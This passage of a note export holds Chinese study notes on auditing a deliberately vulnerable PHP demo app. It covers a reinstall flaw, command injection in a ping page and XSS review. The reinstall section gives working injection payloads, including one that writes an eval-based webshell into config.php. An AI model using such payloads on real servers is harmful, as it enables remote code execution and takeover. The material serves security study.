s":{"fold":"1","id":"20240926153707-du3423b","updated":"20240926153707"},"Children":[{"ID":"20240926153707-g1tsb5h","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240926153707-g1tsb5h","updated":"20240926153707"},"Children":[{"Type":"NodeText","Data":"🌰栗子"}]},{"ID":"20240926153903-rftdu4t","Type":"NodeList","ListData":{},"Properties":{"id":"20240926153903-rftdu4t","updated":"20240926154655"},"Children":[{"ID":"20240926153903-na2mnmq","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926153903-na2mnmq","updated":"20240926154611"},"Children":[{"ID":"20240926153903-7f8fqhf","Type":"NodeParagraph","Properties":{"id":"20240926153903-7f8fqhf","updated":"20240926153939"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"查看install文件夹相关文件内容"}]},{"ID":"20240926154528-buos1k2","Type":"NodeParagraph","Properties":{"id":"20240926154528-buos1k2","updated":"20240926154611"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background2);"},"TextMarkType":"text","TextMarkTextContent":"判断是否有lock文件，存在跳转到index，这里存在跳转但是没有exit，可能导致重装"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background2);\"}"}]},{"ID":"20240926154049-pdhwzhq","Type":"NodeParagraph","Properties":{"id":"20240926154049-pdhwzhq","updated":"20240926154050"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240925191454789"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240925191454789.png?lastModify=1727321533"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20240926154205-ztv6xwl","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926154205-ztv6xwl"},"Children":[{"ID":"20240926154205-xajxue1","Type":"NodeParagraph","Properties":{"id":"20240926154205-xajxue1","updated":"20240926154227"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"进入index.php，包含了sys/config.php 继续跟进"}]},{"ID":"20240926154229-uo31avm","Type":"NodeParagraph","Properties":{"id":"20240926154229-uo31avm","updated":"20240926154232"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240925191712790"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240925191712790.png?lastModify=1727321533"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20240926154233-4nfuexz","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926154233-4nfuexz"},"Children":[{"ID":"20240926154238-de2j2k9","Type":"NodeParagraph","Properties":{"id":"20240926154238-de2j2k9","updated":"20240926154238"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"进入sys/config.php文件，if语句中解释如果没有创建，则上锁重定向到安装文件，退出。而后进入install.php"}]},{"ID":"20240926154238-3dcfmiz","Type":"NodeParagraph","Properties":{"id":"20240926154238-3dcfmiz","updated":"20240926154238"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240925191939463"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240925191939463.png?lastModify=1727321533"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20240926154239-nayljx7","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926154239-nayljx7","updated":"20240926154655"},"Children":[{"ID":"20240926154247-xqnsuf7","Type":"NodeParagraph","Properties":{"id":"20240926154247-xqnsuf7","updated":"20240926154655"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"进入install.php文件，查看数据库相关语句，首先先进行检查数据库地址是否为空，数据库登录名是否正确，数据库是否创建"}]},{"ID":"20240926154251-ps0h2gv","Type":"NodeParagraph","Properties":{"id":"20240926154251-ps0h2gv","updated":"20240926154252"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240925192242920"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240925192242920.png?lastModify=1727321533"},{"Type":"NodeCloseParen"}]}]}]},{"ID":"20240926154302-b3n7wf5","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926154302-b3n7wf5"},"Children":[{"ID":"20240926154302-0wbew8k","Type":"NodeParagraph","Properties":{"id":"20240926154302-0wbew8k"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"然后用数据库的地址，用户名，密码，库名这四个可控参数，连接数据库"}]},{"ID":"20240926154303-83fkv0r","Type":"NodeParagraph","Properties":{"id":"20240926154303-83fkv0r","updated":"20240926154303"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240925192501907"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240925192501907.png?lastModify=1727321533"},{"Type":"NodeCloseParen"}]}]}]},{"ID":"20240926154318-h8j95f7","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926154318-h8j95f7"},"Children":[{"ID":"20240926154318-evuo1k0","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20240926154318-evuo1k0","updated":"20240926154331"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cGhw"},{"Type":"NodeCodeBlockCode","Data":"?dbhost=localhost\u0026dbuser=test\u0026dbpass=test\u0026dbname=tEst\n$dbname=\"\" #可控位置\ntest\";phpinfo();//\"; 闭合标签的恶意代码\n$dbname=\"test\";phpinfo();//\"; #payload展示的样式\n?dbhost=localhost\u0026dbuser=test\u0026dbpass=test\u0026dbname=test\";phpinfo();//\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]}]},{"ID":"20240926154348-hzc9ex3","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926154348-hzc9ex3"},"Children":[{"ID":"20240926154348-tjsef7g","Type":"NodeParagraph","Properties":{"id":"20240926154348-tjsef7g","updated":"20240926154351"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"查看数据库是否存在，存在则弹窗提示"}]},{"ID":"20240926154354-g69x5q1","Type":"NodeParagraph","Properties":{"id":"20240926154354-g69x5q1","updated":"20240926154355"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240925192546419"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240925192546419.png?lastModify=1727321533"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20240926154358-chzf5u1","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926154358-chzf5u1"},"Children":[{"ID":"20240926154402-qw5cxpq","Type":"NodeParagraph","Properties":{"id":"20240926154402-qw5cxpq","updated":"20240926154402"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"如果不存在，则创建数据库，并且传的参数并未做任何校验过滤"}]},{"ID":"20240926154402-g57wguu","Type":"NodeParagraph","Properties":{"id":"20240926154402-g57wguu","updated":"20240926154402"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240925192712246"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240925192712246.png?lastModify=1727321533"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20240926154404-y4beagw","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926154404-y4beagw"},"Children":[{"ID":"20240926154434-m2tjdax","Type":"NodeParagraph","Properties":{"id":"20240926154434-m2tjdax","updated":"20240926154434"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"接着进行数据库连接"}]},{"ID":"20240926154434-sljmnfs","Type":"NodeParagraph","Properties":{"id":"20240926154434-sljmnfs","updated":"20240926154434"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240925193418644"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240925193418644.png?lastModify=1727321533"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20240926154434-s13esjx","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926154434-s13esjx"},"Children":[{"ID":"20240926154440-mcxiezs","Type":"NodeParagraph","Properties":{"id":"20240926154440-mcxiezs","updated":"20240926154440"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"最后将参数写入到config.php文件中，并且覆盖之前的内容"}]},{"ID":"20240926154440-mvbkyix","Type":"NodeParagraph","Properties":{"id":"20240926154440-mvbkyix","updated":"20240926154440"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240925193525157"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240925193525157.png?lastModify=1727321533"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20240926154440-3pqdi0f","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926154440-3pqdi0f","updated":"20240926154445"},"Children":[{"ID":"20240926154445-3p5szfp","Type":"NodeParagraph","Properties":{"id":"20240926154445-3p5szfp","updated":"20240926154445"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"安装过程中写入木马文件，在/install/install.php访问进行抓包，将四个参数进行修改，其中写入一句话木马"}]},{"ID":"20240926154445-0c6oosm","Type":"NodeParagraph","Properties":{"id":"20240926154445-0c6oosm","updated":"20240926154445"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240925222403900"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240925222403900.png?lastModify=1727321575"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240926154219-zow39pw","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20240926154219-zow39pw","updated":"20240926154325"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20240926154219-hz4at4k","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20240926154219-hz4at4k","updated":"20240926154219"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cGhw"},{"Type":"NodeCodeBlockCode","Data":"dbhost=localhost\u0026dbuser=root\u0026dbpass=root\u0026dbname=vauditdemo -- \";@eval($_POST[a]);//\";\u0026Submit=%E5%AE%89%E8%A3%9D\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]}]}]}]}]},{"ID":"20240925151430-x5tek84","Type":"NodeHeading","HeadingLevel":2,"Properties":{"fold":"1","id":"20240925151430-x5tek84","updated":"20240925151434"},"Children":[{"Type":"NodeText","Data":"命令执行漏洞"}]},{"ID":"20240925151528-vh8frly","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240925151528-vh8frly","updated":"20240925151532"},"Children":[{"Type":"NodeText","Data":"产生"}]},{"ID":"20240925151534-nfr4u7m","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240925151534-nfr4u7m","updated":"20240925151600"},"Children":[{"Type":"NodeText","Data":"\t动态执行可控的参数内的命令，本质是对提交的数据过滤不严格"}]},{"ID":"20240925151601-meen28n","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240925151601-meen28n","updated":"20240925151606"},"Children":[{"Type":"NodeText","Data":"利用"}]},{"ID":"20240925151606-ent49dc","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240925151606-ent49dc","updated":"20240925151659"},"Children":[{"Type":"NodeText","Data":"\t攻击者构造恶意命令代码或特殊字符提交"}]},{"ID":"20240925151659-xpljqmp","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240925151659-xpljqmp","updated":"20240925151704"},"Children":[{"Type":"NodeText","Data":"相关函数"}]},{"ID":"20240926154847-x0blcx8","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926154847-x0blcx8","updated":"20240926154847"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240926154847-v6jukbn.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240926155255-zpmhjrx","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926155255-zpmhjrx","updated":"20240926155255"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240926155255-bpltala.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240926113626-fcgwnpq","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240926113626-fcgwnpq","updated":"20240926113631"},"Children":[{"Type":"NodeText","Data":"拼接符"}]},{"ID":"20240926113644-p1rjofp","Type":"NodeBlockquote","Properties":{"fold":"1","heading-fold":"1","id":"20240926113644-p1rjofp","updated":"20240926113709"},"Children":[{"ID":"20240926113645-xlssjo1","Type":"NodeParagraph","Properties":{"id":"20240926113645-xlssjo1","updated":"20240926113645"},"Children":[{"Type":"NodeText","Data":"\u0026 顺序，无论第一是否成功均执行第二个"}]},{"ID":"20240926113645-mdb8eyk","Type":"NodeParagraph","Properties":{"id":"20240926113645-mdb8eyk","updated":"20240926113645"},"Children":[{"Type":"NodeText","Data":"\u0026\u0026 顺序，必须第一个成功才执行第二个"}]},{"ID":"20240926113645-3b3gjp1","Type":"NodeParagraph","Properties":{"id":"20240926113645-3b3gjp1","updated":"20240926113645"},"Children":[{"Type":"NodeText","Data":"| 将第一个的结果传递给第二个"}]},{"ID":"20240926113645-j94xbyk","Type":"NodeParagraph","Properties":{"id":"20240926113645-j94xbyk","updated":"20240926113645"},"Children":[{"Type":"NodeText","Data":"|| 顺序，第一个失败执行第二个"}]},{"ID":"20240926113645-ndo2256","Type":"NodeParagraph","Properties":{"id":"20240926113645-ndo2256","updated":"20240926113645"},"Children":[{"Type":"NodeText","Data":"；顺序，不管第一什么结果均执行第二个"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20240926113709-1r1hvi7","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926113709-1r1hvi7"}},{"ID":"20240926155336-mexezok","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240926155336-mexezok","updated":"20240926155340"},"Children":[{"Type":"NodeText","Data":"审计思路"}]},{"ID":"20240926155406-2ifrnu3","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926155406-2ifrnu3","updated":"20240926155406"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240926155406-bcpmyie.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240926113710-zfaggbr","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240926113710-zfaggbr","updated":"20240926113724"},"Children":[{"Type":"NodeText","Data":"举个🌰"}]},{"ID":"20240926113728-yahohc9","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926113728-yahohc9","updated":"20240926113728"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240925195620692"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240925195620692.png?lastModify=1727321812"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240926113728-jjfitki","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926113728-jjfitki","updated":"20240926113728"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"代码中是直接将用户输入用于构造shell命令，没有进行校验过滤和转义，存在命令注入，并且泄露服务器和网络相关信息"}]},{"ID":"20240926113728-n2z8v8v","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20240926113728-n2z8v8v","updated":"20240926113728"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker"},{"Type":"NodeCodeBlockCode","Data":"\u003c?php\n            if( isset( $_POST[ 'submit' ] ) ) {  //检查是否提交表单\n                $target = $_POST[ 'target' ];   //查看POST请求中获取的target\n                //判断是否为windows操作系统\n                if (stristr(php_uname('s'), 'Windows NT')) {\n                //是则构造ping命令\n                    $cmd = 'ping ' . $target;\n                } else { \n                //不是(可能是Linux、unix)则ping3次\n                    $cmd = 'ping -c 3 ' . $target;\n                }\n                $res = shell_exec( $cmd );// 执行ping命令，并获取执行结果\n// 输出命令和结果，将结果从GB2312编码转换为UTF-8，UTF-8不存在宽字节注入攻击\n                echo \"\u003cbr /\u003e\u003cpre\u003e$cmd\\r\\n\".iconv('GB2312', 'UTF-8',$res).\"\u003c/pre\u003e\";\n            }\n            ?\u003e\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20240926113728-7hyzibd","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926113728-7hyzibd","updated":"20240926113728"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240925195843815"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240925195843815.png?lastModify=1727321812"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240926113728-xu8w9mv","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926113728-xu8w9mv","updated":"20240926113728"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"利用ping.php的ping命令后接|添加其他命令，shell_exec都可执行"}]},{"ID":"20240926113728-qm4afxj","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926113728-qm4afxj","updated":"20240926113728"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"先进入"},{"Type":"NodeTextMark","TextMarkType":"a","TextMarkAHref":"http://vauditdemo/admin/log.php","TextMarkTextContent":"http://vauditdemo/admin/log.php"},{"Type":"NodeText","Data":"登录：admin：admin"}]},{"ID":"20240926113728-e3bsslw","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926113728-e3bsslw","updated":"20240926113728"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"进入ping.php"}]},{"ID":"20240926113728-613z7r4","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926113728-613z7r4","updated":"20240926113728"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"正常ping百度"}]},{"ID":"20240926113728-dv0ap2o","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926113728-dv0ap2o","updated":"20240926113728"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240925203628094"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240925203628094.png?lastModify=1727321812"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240926113728-qawgazq","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926113728-qawgazq","updated":"20240926113728"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"根据命令执行漏洞"}]},{"ID":"20240926113728-vy7m0uz","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926113728-vy7m0uz","updated":"20240926113728"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240925203722797"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"file:///C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20240925203722797.png?lastModify=1727321812"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240926090630-lr1iq6z","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20240926090630-lr1iq6z","updated":"20240926090657"},"Children":[{"Type":"NodeText","Data":"XSS（跨站脚本攻击）漏洞"}]},{"ID":"20240927111021-stgcws2","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240927111021-stgcws2","updated":"20240927111043"},"Children":[{"Type":"NodeText","Data":"产生原因"}]},{"ID":"20240927111044-qznhh7z","Type":"NodeParagraph","Properties":{"id":"20240927111044-qznhh7z","updated":"20240927111053"},"Children":[{"Type":"NodeText","Data":"寻找参数未过滤的输出函数"}]},{"ID":"20240927110832-m7spnpy","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240927110832-m7spnpy","updated":"20240927111011"},"Children":[{"Type":"NodeText","Data":"相关函数"}]},{"ID":"20240927111054-39354mo","Type":"NodeParagraph","Properties":{"id":"20240927111054-39354mo","updated":"20240927111102"},"Children":[{"Type":"NodeText","Data":"常见的输出函数有"}]},{"ID":"20240927111103-x41ysyk","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20240927111103-x41ysyk","updated":"20240927111207"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cGhw"},{"Type":"NodeCodeBlockCode","Data":"echo、printf、print、print_f、sprintf、die、var_dump、var_export\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20240927111014-ynrdjy1","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240927111014-ynrdjy1","updated":"20240927111218"},"Children":[{"Type":"NodeText","Data":"审计思路"}]},{"ID":"20240927111325-gfedjq1","Type":"NodeParagraph","Properties":{"id":"20240927111325-gfedjq1","updated":"20240927111325"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240927111325-c8hchgw.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240927111222-jjeydl0","Type":"NodeList","ListData":{},"Properties":{"id":"20240927111222-jjeydl0","updated":"20240927111225"},"Children":[{"ID":"20240927111225-pjjrzsc","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927111225-pjjrzsc","updated":"20240927111225"},"Children":[{"ID":"20240927111225-9jahors","Type":"NodeParagraph","Properties":{"id":"20240927111225-9jahors","updated":"20240927111249"},"Children":[{"Type":"NodeText","Data":"反射型、存储型：需要跟踪输入输出位置是否有过滤"}]}]},{"ID":"20240927111250-401sw42","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927111250-401sw42"},"Children":[{"ID":"20240927111250-wb7irg6","Type":"NodeParagraph","Properties":{"id":"20240927111250-wb7irg6","updated":"20240927111309"},"Children":[{"Type":"NodeText","Data":"DOM型：要对js做审计查看是否直接输出的js代码"}]}]},{"ID":"20240927111310-1qb3aef","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927111310-1qb3aef"},"Children":[{"ID":"20240927111358-mow9ohj","Type":"NodeParagraph","Properties":{"id":"20240927111358-mow9ohj","updated":"20240927111358"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240927111358-vvw6kz4.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]}]},{"ID":"20240927111407-8csf48i","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240927111407-8csf48i","updated":"20240927111415"},"Children":[{"Type":"NodeText","Data":"修复方法"}]},{"ID":"20240927111422-g60ubwp","Type":"NodeList","ListData":{},"Properties":{"id":"20240927111422-g60ubwp","updated":"20240927111426"},"Children":[{"ID":"20240927111426-jsuo622","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240927111426-jsuo622","updated":"20240927111426"},"Children":[{"ID":"20240927111426-sz65k6o","Type":"NodeParagraph","Properties":{"id":"20240927111426-sz65k6o","updated":"20240927111451"},"Children":[{"Type":"NodeText","Data":"htmlspecialchars()函数 -- 